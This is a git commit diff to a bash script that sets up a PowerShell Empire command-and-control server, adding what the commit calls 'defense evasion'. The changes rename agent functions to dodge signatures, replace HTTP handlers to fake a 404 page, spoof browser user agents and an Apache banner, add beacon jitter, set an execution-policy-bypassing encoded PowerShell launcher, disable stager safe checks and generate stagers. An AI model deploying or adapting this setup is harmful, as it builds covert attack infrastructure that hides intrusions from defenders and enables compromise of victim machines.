7e990dcab9d264a8be9e1ba485e1fe4517c271b8
ccammilleri <caseycam@gmail.com>
2019-03-05 13:56:58 -0600

    add defense evasion for 2.5

--- configs/empire_setup.bash
+++ configs/empire_setup.bash
@@ -6,9 +6,19 @@ sudo apt-get -y install git-core screen
 sudo apt-get -y install python2.7 python2.7-dev
 sudo ln -s /usr/bin/python2.7 /usr/bin/python
 
-# install and configure empire
+# download empire
 git clone https://github.com/EmpireProject/Empire
 cd Empire
+
+# modify Empire for defense evasion
+sed -i 's/Invoke\-Empire/Invoke\-Upgrade/' ~/Empire/data/agent/stagers/http.ps1
+sed -i 's/Invoke\-Empire/Invoke\-Upgrade/' ~/Empire/data/agent/agent.ps1
+
+# modify http 404 page for defense evasion (these files are uploaded: see main.tf)
+cp /tmp/custom-common-httpy.py ~/Empire/lib/common/http.py
+cp /tmp/custom-listener-http.py ~/Empire/lib/listeners/http.py
+
+# install empire
 RANDKEY=`cat /dev/urandom | tr -dc '0-9' | fold -w ${1:-32} | head -1`
 sudo STAGING_KEY=$RANDKEY ./setup/install.sh
 
@@ -22,16 +32,31 @@ listeners
 uselistener http
 set Name http80
 set Host http://$EIP:80
+set DefaultProfile /content/uploads,/feeds/updated,/sitemap/poll|Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko
+set UserAgent Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko
+set DefaultJitter 0.3
+set ServerVersion Apache/2.4.1 (Unix) 
+set StagerURI /download/20180421
+set Launcher powershell -WindowStyle 1 -sta -ExecutionPolicy bypass -noP -enc
 execute
 listeners
 uselistener http
 set Name https443
 set Host https://$EIP:443
+set DefaultProfile /content/uploads,/feeds/updated,/sitemap/poll|Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko
+set UserAgent Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko
+set DefaultJitter 0.3
+set ServerVersion Apache/2.4.1 (Unix)
+set StagerURI /download/20180421
+set Launcher powershell -WindowStyle 1 -sta -ExecutionPolicy bypass -noP -enc
+set CertPath /home/ubuntu/Empire/data/
 set Port 443
 execute
 listeners
 usestager multi/launcher
 set Listener http80
+set SafeChecks False
+set UserAgent Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko
 set OutFile stager-http80.txt
 generate
 unset OutFile
@@ -39,13 +64,18 @@ generate
 listeners
 usestager multi/launcher
 set Listener https443
+set SafeChecks False
+set UserAgent Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko
 set OutFile stager-https443.txt
 generate
 unset OutFile
 generate
-
 EOF
 ) > startup.rc
+
+# modify Empire for defense evasion
+sed -i 's/Invoke\-Empire/Invoke\-Upgrade/' ~/Empire/data/agent/stagers/http.ps1
+sed -i 's/Invoke\-Empire/Invoke\-Upgrade/' ~/Empire/data/agent/agent.ps1
 
 # start empire
 screen -dmS empire sudo ./empire
